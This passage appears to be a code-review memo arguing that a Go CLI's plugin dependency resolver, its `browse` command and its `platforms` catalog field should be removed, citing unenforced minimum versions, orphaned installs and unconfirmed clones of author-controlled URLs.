- `min_version` is computed but **never enforced on the outcome**. `ExecuteDepPlan` installs the newest tag, so if newest < minimum the install reports success and `doctor` nags forever. The diamond-constraint resolver I fixed computes a constraint nothing downstream checks.
- **Orphans leak permanently.** There's no `auto_installed` marker, so `install brain` pulls `sem` and `remove brain` leaves it behind, with doctor silent.
- Planning does one `ls-remote` plus one-to-two shallow clones **per dependency** against author-controlled URLs, before any confirmation.
- Plugins are standalone executables over PATH with no protocol or ABI — which is the only thing a dependency solver reconciles.

And the empirical argument: **five of the review findings landed in `plugin_deps.go`, across five separate rounds**, including the one I just fixed. The subsystem keeps generating defects faster than the rest of the feature.

The counter Thomas will reasonably raise — "plugins may grow real dependencies, and re-adding is harder than keeping" — is weaker now that decoding is lenient: a future CLI can add `requires[]` back and older CLIs will ignore it rather than break. That was the blocker, and it's gone.

The runtime alternative is roughly five lines in the plugin: `exec.LookPath("entire-sem")`, else print an install hint.

**2. `browse`** — no capability over `search` + `install`, requires a TTY, installs with no confirmation, over a catalog with three entries.

**3. `platforms` in `index.json`** — warning-only; the install proceeds regardless. And it lives in the catalog rather than with the author, so it drifts and then warns about a working plugin.

**Already resolved from the original four:** `index_ttl_hours` went with the settings removal.

My read: item 1 is worth a real conversation, items 2 and 3 are easy yeses whenever he wants them. If he'd rather keep `requires[]`, the two things I'd fix instead are enforcing `min_version` post-install and adding an `auto_installed` marker so orphans can be cleaned — those close the two gaps that make it actively misleading rather than merely unused.
